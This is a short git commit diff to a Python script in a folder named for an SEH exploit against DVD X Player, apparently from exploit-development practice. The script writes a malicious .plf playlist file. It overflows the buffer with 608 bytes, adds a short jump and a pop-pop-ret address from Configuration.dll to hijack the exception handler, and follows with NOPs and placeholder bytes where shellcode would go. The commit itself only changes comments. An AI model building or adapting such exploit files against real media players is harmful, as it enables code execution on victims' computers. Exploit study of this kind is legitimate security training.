bad46fb4d856324c4dffe243f7eb0a638a47d4d8
bloggins <bloggins.jason@gmail.com>
2020-07-23 06:59:01 -0400

    Update 5.py

--- 2.SEH-DVDXPlayer/5.py
+++ 2.SEH-DVDXPlayer/5.py
@@ -1,5 +1,6 @@
 #0x6034023c : pop edi # pop ebx # ret 0x04 |  [Configuration.dll]
-#jmp+6 EB 06
+#jmp+8 EB 06
+#612-4 to account for SE Handler
 buffer = "A"*608 +"\xeb\x06\x90\x90" + "\x3c\x02\x34\x60" + "\x90"*20 + "X"*250
 f = open('5.plf','w')
 f.write(buffer)
